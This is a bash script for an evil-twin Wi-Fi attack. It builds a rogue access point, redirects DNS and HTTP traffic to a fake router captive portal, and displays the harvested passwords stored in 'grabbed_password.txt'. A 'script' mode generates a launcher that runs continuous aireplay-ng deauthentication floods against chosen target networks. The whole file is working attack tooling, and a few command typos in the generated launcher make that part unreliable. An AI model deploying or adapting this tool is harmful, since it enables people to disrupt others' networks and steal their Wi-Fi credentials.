#!/bin/bash

#########################################################################################################

if [ "$(id -u)" != "0" ]; then
	echo "[!] This script must be run as root."
	exit 1
fi

# General
interface=wlan0
sleep_time=1

# Chosen web module
chosen_module="en_generic_router"

# Hosted Network
ssid="HOTSPOT"
bssid=00:AA:11:BB:22:CC
channel=6
hidessid=0						# Hide SSID
wpa=0							# 3=ON 0=OFF
wpa_passphrase="password"		# 8 char minimum
handshake=""

# Network
default_gateway="192.168.0.1"
fake_dns_resp="8.8.8.8"

#########################################################################################################

function fx_check_dependencies {

	missing=""
	dep=('iptables' 'psmisc' 'net-tools' 'aircrack-ng' 'screen' 'hostapd' 'isc-dhcp-server' 'python-dev' 'python-pip' 'python-dev' 'python-pip')

	t=$(/usr/bin/dpkg -s aircrack-ng &> /dev/null; echo $?)


	for (( j=0; j<${#dep[@]}; j++ )); do
		t=$(/usr/bin/dpkg -s ${dep[j]} &> /dev/null; echo $?)
		if [ "$t" -ne 0 ]; then
			echo -e "[!] ${dep[j]} Not installed"
			missing="$missing ${dep[j]}"
		else
			echo -e "[*] ${dep[j]} Installed"

		fi

	done


	if [ ! -z "$missing" ]; then
		echo
		echo "[!] Missing dependencies, please do:"; echo
		echo "    apt-get update; apt-get install $missing -y"
		exit 1
	fi
	

}

#########################################################################################################

function fx_reset_network {
	killall dhcpd
	killall hostapd
	airmon-ng check kill
	iptables -P INPUT ACCEPT
	iptables -P OUTPUT ACCEPT
	iptables -P FORWARD ACCEPT
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
}

#########################################################################################################

function fx_captive_start {


	# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - HOSTAPD


	(echo "interface=$interface
driver=nl80211
ssid=$ssid
hw_mode=g
channel=$channel
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=$hidessid
wpa=$wpa
wpa_passphrase=$wpa_passphrase
wpa_pairwise=TKIP
rsn_pairwise=CCMP") > /tmp/hostpad-conf.conf

	counter=0
	while [[ -z "$running" && $counter -lt "5" ]]; do

		echo "[*] Launching hostapd (attempt $counter)"

		sleep 1
		ifconfig $interface down
		ifconfig $interface up
		
		killall hostapd
		hostapd /tmp/hostpad-conf.conf -B #>/dev/null &

		running=$(ps cax | grep hostapd)
		counter=$((counter+1))

	done


	# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ISC-DHCP-SERVER

	
	if [ ! -d /var/lib/dhcp ]; then mkdir /var/lib/dhcp; fi
	if [ ! -f /var/lib/dhcp/dhcpd.leases ]; then touch /var/lib/dhcp/dhcpd.leases; fi
	
	ifconfig $interface  up
	ifconfig $interface  192.168.0.1 netmask 255.255.255.0

	if [ ! -f /var/run/dhcpd.pid ]; then touch /var/run/dhcpd.pid; fi
	chmod +x /var/run/dhcpd.pid

	(echo "authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 192.168.0.0 netmask 255.255.255.0 {
		option subnet-mask 255.255.255.0;
		option broadcast-address 192.168.0.255;
		option routers 192.168.0.1;
		option domain-name-servers 192.168.0.1; #DNS SERVER
		range 192.168.0.2 192.168.0.202;
}") > /tmp/dhcpd-conf.conf


	dhcpd -q -cf /tmp/dhcpd-conf.conf $interface #> /dev/null &


	# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - IPTABLES


	iptables -P INPUT DROP
	iptables -P OUTPUT DROP
	iptables -P FORWARD DROP

	iptables -A INPUT -p udp -m udp --sport 53 -j ACCEPT
	iptables -A INPUT -p tcp -m tcp --sport 80 -j ACCEPT
	iptables -A INPUT -p tcp -m tcp --sport 443 -j ACCEPT
	iptables -A INPUT -p tcp -m tcp --sport 8000 -j ACCEPT
	iptables -A INPUT -p udp -m udp --dport 53 -j ACCEPT
	iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
	iptables -A INPUT -p tcp -m tcp --dport 443 -j ACCEPT
	iptables -A INPUT -p tcp -m tcp --dport 8000 -j ACCEPT

	iptables -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
	iptables -A OUTPUT -p tcp -m tcp --dport 80 -j ACCEPT
	iptables -A OUTPUT -p tcp -m tcp --dport 443 -j ACCEPT
	iptables -A OUTPUT -p tcp -m tcp --dport 8000 -j ACCEPT
	iptables -A OUTPUT -p udp -m udp --sport 53 -j ACCEPT
	iptables -A OUTPUT -p tcp -m tcp --sport 80 -j ACCEPT
	iptables -A OUTPUT -p tcp -m tcp --sport 443 -j ACCEPT
	iptables -A OUTPUT -p tcp -m tcp --sport 8000 -j ACCEPT

	iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $default_gateway:53
	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $default_gateway:80
	iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $default_gateway:443
	iptables -t nat -A PREROUTING -p tcp --dport 8000 -j DNAT --to-destination $default_gateway:8000

	# Only for rpi-ssh
	iptables -A INPUT -i eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
	iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT

	iptables -A INPUT -i $interface -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
	iptables -A OUTPUT -o $interface -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT


	# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - SERVERS


	echo "[*] Launching web_server"
	screen -dm bash -c "python web_server.py -a $default_gateway -p 80 -m $chosen_module"

	echo "[*] Launching dns_server"
	screen -dm bash -c "python dns_server.py -a 8.8.8.8"


	# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ECHO


	echo
	echo "###########################################################"
	echo "#                      Started                            #"
	echo "###########################################################"

} # END OF CAPTIVE START

#########################################################################################################

function fx_captive_stop {

	# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - NETWORK

	fx_reset_network
	service network-manager start

	# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - PROCESSES

	if [ -f "/tmp/web_server.PID" ]; then
		web_server_pid=$(cat /tmp/web_server.PID)
		kill $web_server_pid
		if [ "$?" -eq 0 ]; then 
			echo "[*] Killed web_server.py (PID: $web_server_pid)"
		else
			echo "[!] Error killing web_server.py (No PID found)"
		fi
		rm -f /tmp/web_server.PID
	else
		echo "[!] Error killing web_server.py (/tmp/web_server.PID not found)"
	fi


	if [ -f "/tmp/dns_server.PID" ]; then
		dns_server_pid=$(cat /tmp/dns_server.PID)
		kill $dns_server_pid
		if [ "$?" -eq 0 ]; then 
			echo "[*] Killed dns_server.py (PID: $dns_server_pid)"
		else
			echo "[!] Error killing dns_server.py (No PID found)"
		fi
		rm -f /tmp/dns_server.PID
	else
		echo "[!] Error killing dns_server.py (/tmp/dns_server.PID not found)"
	fi

	# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - CAT

	echo
	echo "###########################################################"
	echo "#  Showing data gathered with the script...               #"
	echo "###########################################################"
	echo
	cat "grabbed_password.txt"
	echo

} # END OF CAPTIVE STOP

#########################################################################################################

function fx_usage { 
	echo "Usage: $0 [Options] [Mode]"
	echo
	echo "OPTIONS:"
	echo "  -i       interface"
	echo "  -c       channel"
	echo "  -s       ssid"
	echo "  -m       module"
	echo "  -p       password (not required)"
	echo
	echo "MODES:"
	echo "  list       list all modules available"
	echo "  start      start the captive_portal"
	echo "  stop       stop the captive_portal"
	echo "  check      check users.txt and lease file"
	echo "  script     generate a script"
	echo 
	echo "EXAMPLE: "
	echo "   ./captive_portal.sh -i wlan0 -c 1 -s TEST -m en_generic_router start"
	echo 
	exit 1
}

#########################################################################################################

while getopts ":i:c:s:m:p:a:h:" x; do
	case "${x}" in
		i)
			i=${OPTARG}
			;;
		c)
			c=${OPTARG}
			;;
		s)
			s=${OPTARG}
			;;
		m)
			m=${OPTARG}
			;;
		p)
			p=${OPTARG}
			;;
		*)
			#fx_usage
			;;
	esac
done
shift $((OPTIND-1))

if [ -z "$1" ]; then
	echo "[!] MODE REQUIRED"; echo
	fx_usage
	exit 1
fi

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

if [ "$1" == "list" ]; then

	echo
	echo "[*] Available modules: "
	echo
	echo -e "from templates import template_list\ntl = template_list.template_list\noutarr = []\nfor e in tl:\n\toutarr.append(e)\nfor e in sorted(outarr):\n\tprint e" | python
	echo
	echo
	exit 0
fi

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

if [ "$1" == "start" ]; then


	if [ -f "/tmp/web_server.PID" ] || [ -f "/tmp/dns_server.PID" ]; then
		echo "[!] Script already running, try: "
		echo "    ./captive_portal.sh stop"
		exit 1


	elif [ -z "${i}" ] || [ -z "${c}" ] || [ -z "${s}" ] || [ -z "${m}" ]; then
		echo "[!] i, c, s, m, need to be set"; echo
		fx_usage
		exit 1


	elif [[ ! -d "/sys/class/net/${i}" ]]; then
		echo "[!] INTERFACE: ${i} Not found or not up."; echo
		exit 1


	# Check if module is present in template_list.py
	elif ! grep -q ${m} templates/template_list.py; then
	 	echo "[!] MODULE ${m} NOT FOUND."; echo
	 	exit 1

	else
		fx_check_dependencies

		interface=${i}
		sleep_time=1
		chosen_module=${m}
		ssid=${s}
		bssid="00:AA:11:BB:22:CC"
		channel=${c}
		hidessid=0

		if [ -z "${p}" ]; then
			wpa=0
			wpa_passphrase="password"
		else
			wpa=3
			wpa_passphrase=${p}
		fi

		echo
		echo "Interface:   $interface"
		echo "Channel:     $channel"
		echo "Essid:       $ssid"
		echo "Bssid:       $bssid"
		echo "Modulo_Web:  $chosen_module"
		echo "Wpa:         $wpa"
		echo "Password:    $wpa_passphrase"
		echo "Handshake:   $handshake"
		echo

		fx_reset_network
		fx_captive_start

		exit 0

	fi

fi

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

if [ "$1" == "stop" ]; then

	web_server_pid_status=0
	dns_server_pid_status=0

	if [ ! -f "/tmp/web_server.PID" ]; then web_server_pid_status=1; fi
	if [ ! -f "/tmp/dns_server.PID" ]; then dns_server_pid_status=1; fi


	fx_captive_stop

	echo "###########################################################"
	echo "#                      Stopped                            #"

	if [ "$web_server_pid_status" == "1" ] || [ "$dns_server_pid_status" == "1" ]; then 
		echo "#                                                         #"; 
	fi

	if [ "$web_server_pid_status" == "1" ]; then echo "# No PID found for web_server                             #"; fi
	if [ "$dns_server_pid_status" == "1" ]; then echo "# No PID found for dns_server                             #"; fi

	echo "###########################################################"

	exit 0
fi

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

if [ "$1" == "check" ]; then
	if [ -f "/tmp/web_server.PID" ] && [ -f "/tmp/dns_server.PID" ]; then
		cont=0
		while true
			do
			cont=$((cont + 1))
			lease_list=($(dhcp-lease-list --parsable | grep "192.168" | awk '{print  $2"__"$4"__"$6}'))
			clear
			echo "CHECK - Time ($cont sec.)"
			echo "┌───────────────────────┐"
			echo "│ Dhcp:                 │"
			echo "└───────────────────────┘"
			#cat /var/lib/dhcp/dhcpd.leases | grep "lease 192" | cut -d " " -f 2
			for i in ${lease_list[@]}; do echo -e $i; done
			echo
			echo "┌───────────────────────┐"
			echo "│ Data:                 │"
			echo "└───────────────────────┘"
			cat grabbed_password.txt 
			echo
			echo "────────────────────────"
			echo "(ctrl+c to stop)"
			sleep 1
		done
	else
		echo "[!] Captive Portal not running."
		exit 1
	fi
fi

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

if [ "$1" == "script" ]; then

	printf "[?] Script name: "; read script_name

	(echo '#!/bin/bash
interface=""
channel=""
ssid=""
module=""
password=""

interface_24=""		# interface for 2,5ghz target
bssid_24=""			# bssid for 2,5ghz target
channel_24=""		# channel for 2,5ghz target
ssid_24=""	    	# ssid for 2,5ghz target

interface_50=""		# interface for 5ghz target
bssid_50=""			# bssid for 5ghz target
channel_50=""		# channel for 5ghz target
ssid_50=""			# ssid for 5ghz target

########################################################################################
# DO NOT TOUCH FROM HERE
########################################################################################


bash captive_portal.sh -i "$interface" -c "$channel" -s "$ssid" -m "$module" start

if [[ ! -z "$interface_24" ]]; then
	airmon-ng check kill
	airmong-ng stop $interface_24mon
	airmong-ng start $interface_24 $channel_24

	aireplay-ng -0 0 -a "$bssid_24" "$interface_24mon" &> /dev/null &
	echo "[*] Deauth started on $bssid_24 (2,4ghz)"

fi

if [[ ! -z "$interface_50" ]]; then
	airmon-ng check kill
	airmong-ng stop $interface_50mon
	airmong-ng start $interface_50 $channel_50

	aireplay-ng -0 0 -a "$bssid_50" "$interface_50mon" &> /dev/null &
	echo "[*] Deauth started on $bssid_50 (5,0ghz)"

fi

echo "[*] All done."') > $script_name

	chmod +x $script_name
	echo "[*] Script wrote, check variables before running it."
	exit 0

fi

#########################################################################################################

exit 1